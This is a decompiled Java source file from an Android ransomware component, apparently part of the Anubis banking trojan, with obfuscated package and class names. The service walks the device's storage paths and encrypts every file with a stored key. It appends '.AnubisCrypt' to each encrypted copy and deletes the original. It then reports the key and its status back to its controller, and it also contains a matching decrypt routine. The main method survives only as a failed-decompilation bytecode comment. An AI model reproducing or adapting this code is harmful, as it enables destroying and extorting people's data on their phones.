package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import java.io.File;
import java.io.FileOutputStream;

public class wahiuolww extends IntentService {

    /* renamed from: a */
    C0034b f590a = new C0034b();

    /* renamed from: b */
    String f591b = "";

    /* renamed from: c */
    String f592c = "";

    public wahiuolww() {
        super("wahiuolww");
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo458a(File file) {
        File[] listFiles;
        FileOutputStream fileOutputStream;
        try {
            for (File file2 : file.listFiles()) {
                if (file2.isDirectory()) {
                    mo459b(file2);
                } else if (file2.isFile()) {
                    try {
                        C0034b bVar = this.f590a;
                        byte[] a = C0034b.m234a(file2);
                        if (this.f591b.equals("crypt")) {
                            if (!file2.getPath().contains(".AnubisCrypt")) {
                                byte[] a2 = this.f590a.mo216a(a, this.f592c);
                                StringBuilder sb = new StringBuilder();
                                sb.append(file2.getPath());
                                sb.append(".AnubisCrypt");
                                fileOutputStream = new FileOutputStream(sb.toString(), true);
                                fileOutputStream.write(a2);
                            }
                        } else if (this.f591b.equals("decrypt") && file2.getPath().contains(".AnubisCrypt")) {
                            byte[] b = this.f590a.mo224b(a, this.f592c);
                            fileOutputStream = new FileOutputStream(file2.getPath().replace(".AnubisCrypt", ""), true);
                            fileOutputStream.write(b);
                        }
                        fileOutputStream.close();
                        file2.delete();
                    } catch (Exception unused) {
                    }
                }
            }
        } catch (Exception unused2) {
        }
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: b */
    public void mo459b(File file) {
        File[] listFiles;
        FileOutputStream fileOutputStream;
        try {
            for (File file2 : file.listFiles()) {
                if (file2.isDirectory()) {
                    mo459b(file2);
                } else if (file2.isFile()) {
                    try {
                        C0034b bVar = this.f590a;
                        byte[] a = C0034b.m234a(file2);
                        if (this.f591b.equals("crypt")) {
                            if (!file2.getPath().contains(".AnubisCrypt")) {
                                byte[] a2 = this.f590a.mo216a(a, this.f592c);
                                StringBuilder sb = new StringBuilder();
                                sb.append(file2.getPath());
                                sb.append(".AnubisCrypt");
                                fileOutputStream = new FileOutputStream(sb.toString(), true);
                                fileOutputStream.write(a2);
                            }
                        } else if (this.f591b.equals("decrypt") && file2.getPath().contains(".AnubisCrypt")) {
                            byte[] b = this.f590a.mo224b(a, this.f592c);
                            fileOutputStream = new FileOutputStream(file2.getPath().replace(".AnubisCrypt", ""), true);
                            fileOutputStream.write(b);
                        }
                        fileOutputStream.close();
                        file2.delete();
                    } catch (Exception unused) {
                    }
                }
            }
        } catch (Exception unused2) {
        }
    }

    /* access modifiers changed from: protected */
    /* JADX WARNING: Can't wrap try/catch for region: R(15:0|1|2|3|4|5|6|7|8|(2:9|10)|11|(1:14)(4:16|(1:18)|19|20)|15|19|20) */
    /* JADX WARNING: Can't wrap try/catch for region: R(16:0|1|2|3|4|5|6|7|8|9|10|11|(1:14)(4:16|(1:18)|19|20)|15|19|20) */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0049 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x0055 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:7:0x0061 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:9:0x006d */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x0083  */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x00cc  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onHandleIntent(android.content.Intent r7) {
        /*
            r6 = this;
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a
            java.lang.String r0 = "status"
            java.lang.String r7 = r7.mo234e(r6, r0)
            r6.f591b = r7
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a
            java.lang.String r0 = "key"
            java.lang.String r7 = r7.mo234e(r6, r0)
            r6.f592c = r7
            java.io.File r7 = new java.io.File
            java.lang.String r0 = "/mnt"
            r7.<init>(r0)
            java.io.File r0 = new java.io.File
            java.lang.String r1 = "/mount"
            r0.<init>(r1)
            java.io.File r1 = new java.io.File
            java.lang.String r2 = "/sdcard"
            r1.<init>(r2)
            java.io.File r2 = new java.io.File
            java.lang.String r3 = "/storage"
            r2.<init>(r3)
            wocwvy.czyxoxmbauu.slsa.b r3 = r6.f590a     // Catch:{ Exception -> 0x0049 }
            java.lang.String r4 = "Cryptolocker"
            java.lang.String r5 = "1"
            r3.mo213a(r4, r5)     // Catch:{ Exception -> 0x0049 }
            java.io.File r3 = android.os.Environment.getExternalStorageDirectory()     // Catch:{ Exception -> 0x0049 }
            r6.mo458a(r3)     // Catch:{ Exception -> 0x0049 }
            wocwvy.czyxoxmbauu.slsa.b r3 = r6.f590a     // Catch:{ Exception -> 0x0049 }
            java.lang.String r4 = "Cryptolocker"
            java.lang.String r5 = "2"
            r3.mo213a(r4, r5)     // Catch:{ Exception -> 0x0049 }
        L_0x0049:
            r6.mo458a(r7)     // Catch:{ Exception -> 0x0055 }
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a     // Catch:{ Exception -> 0x0055 }
            java.lang.String r3 = "Cryptolocker"
            java.lang.String r4 = "3"
            r7.mo213a(r3, r4)     // Catch:{ Exception -> 0x0055 }
        L_0x0055:
            r6.mo458a(r0)     // Catch:{ Exception -> 0x0061 }
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a     // Catch:{ Exception -> 0x0061 }
            java.lang.String r0 = "Cryptolocker"
            java.lang.String r3 = "4"
            r7.mo213a(r0, r3)     // Catch:{ Exception -> 0x0061 }
        L_0x0061:
            r6.mo458a(r1)     // Catch:{ Exception -> 0x006d }
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a     // Catch:{ Exception -> 0x006d }
            java.lang.String r0 = "Cryptolocker"
            java.lang.String r1 = "5"
            r7.mo213a(r0, r1)     // Catch:{ Exception -> 0x006d }
        L_0x006d:
            r6.mo458a(r2)     // Catch:{ Exception -> 0x0079 }
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a     // Catch:{ Exception -> 0x0079 }
            java.lang.String r0 = "Cryptolocker"
            java.lang.String r1 = "6"
            r7.mo213a(r0, r1)     // Catch:{ Exception -> 0x0079 }
        L_0x0079:
            java.lang.String r7 = r6.f591b
            java.lang.String r0 = "crypt"
            boolean r7 = r7.equals(r0)
            if (r7 == 0) goto L_0x00cc
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a
            java.lang.String r0 = "4"
            java.lang.StringBuilder r1 = new java.lang.StringBuilder
            r1.<init>()
            java.lang.String r2 = "p="
            r1.append(r2)
            wocwvy.czyxoxmbauu.slsa.b r2 = r6.f590a
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            wocwvy.czyxoxmbauu.slsa.b r4 = r6.f590a
            java.lang.String r4 = r4.mo247q(r6)
            r3.append(r4)
            java.lang.String r4 = "|The Cryptor is activated, the file system is encrypted by key: "
            r3.append(r4)
            java.lang.String r4 = r6.f592c
            r3.append(r4)
            java.lang.String r4 = "|"
            r3.append(r4)
            java.lang.String r3 = r3.toString()
            java.lang.String r2 = r2.mo225c(r3)
            r1.append(r2)
            java.lang.String r1 = r1.toString()
            r7.mo218b(r6, r0, r1)
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a
            java.lang.String r0 = "cryptfile"
            java.lang.String r1 = "true"
        L_0x00c8:
            r7.mo233d(r6, r0, r1)
            goto L_0x0112
        L_0x00cc:
            java.lang.String r7 = r6.f591b
            java.lang.String r0 = "decrypt"
            boolean r7 = r7.equals(r0)
            if (r7 == 0) goto L_0x0112
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a
            java.lang.String r0 = "4"
            java.lang.StringBuilder r1 = new java.lang.StringBuilder
            r1.<init>()
            java.lang.String r2 = "p="
            r1.append(r2)
            wocwvy.czyxoxmbauu.slsa.b r2 = r6.f590a
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            wocwvy.czyxoxmbauu.slsa.b r4 = r6.f590a
            java.lang.String r4 = r4.mo247q(r6)
            r3.append(r4)
            java.lang.String r4 = "|File System is Decrypted!|"
            r3.append(r4)
            java.lang.String r3 = r3.toString()
            java.lang.String r2 = r2.mo225c(r3)
            r1.append(r2)
            java.lang.String r1 = r1.toString()
            r7.mo218b(r6, r0, r1)
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a
            java.lang.String r0 = "cryptfile"
            java.lang.String r1 = "false"
            goto L_0x00c8
        L_0x0112:
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a
            java.lang.String r0 = "status"
            java.lang.String r1 = ""
            r7.mo233d(r6, r0, r1)
            wocwvy.czyxoxmbauu.slsa.b r7 = r6.f590a
            java.lang.String r0 = "key"
            java.lang.String r1 = ""
            r7.mo233d(r6, r0, r1)
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.wahiuolww.onHandleIntent(android.content.Intent):void");
    }
}
